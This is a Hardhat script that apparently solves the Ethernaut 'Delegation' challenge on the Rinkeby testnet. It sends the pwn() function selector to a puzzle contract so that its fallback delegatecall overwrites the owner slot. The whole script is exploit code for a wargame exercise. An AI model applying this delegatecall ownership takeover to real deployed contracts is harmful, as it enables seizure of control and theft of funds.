/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const { deployed } = require('./deployed')
const INSTANCE = "0x276a28164db5E1D61AfBbb1B2e4fCD7Cb596AB93"

async function instanceState(rinkeby) {
  console.log('                          INSTANCE STATE')

  console.log("Storage '0': owner", ethers.utils.hexlify(ethers.utils.stripZeros(await rinkeby.getStorageAt(INSTANCE, 0))))
  console.log(`Storage '1': delegate.sol address `, ethers.utils.hexlify(ethers.utils.stripZeros(await rinkeby.getStorageAt(INSTANCE, 1))))
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')
  console.log(`Using address: ${deployer.address}`)

  const Delegate = await hre.ethers.getContractFactory('Delegate')
  const Delegation = await hre.ethers.getContractFactory('Delegation')
  let delegation = Delegation.attach(INSTANCE)
  
  await instanceState(rinkeby)

  // STEP 1
  // Make a delegatecall to claim ownership from another contract
  // get Selector from de function pwn()
  const selector = Delegate.interface.getSighash('pwn')
  // get the address of delagate
  console.log("Delegation \"Fallback\": Sending transaction...")
  // Get estimations of gas
  const gas = await deployer.estimateGas({to: INSTANCE, data: selector})
  console.log(gas.toString())
  console.log(gas)
 
  const tx = await deployer.sendTransaction({to: INSTANCE, data: selector, gasLimit: gas * 2})
  const receipt = await tx.wait()
  console.log(receipt)
  console.log("Transaction valided !")
  
  
  await instanceState(rinkeby)
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
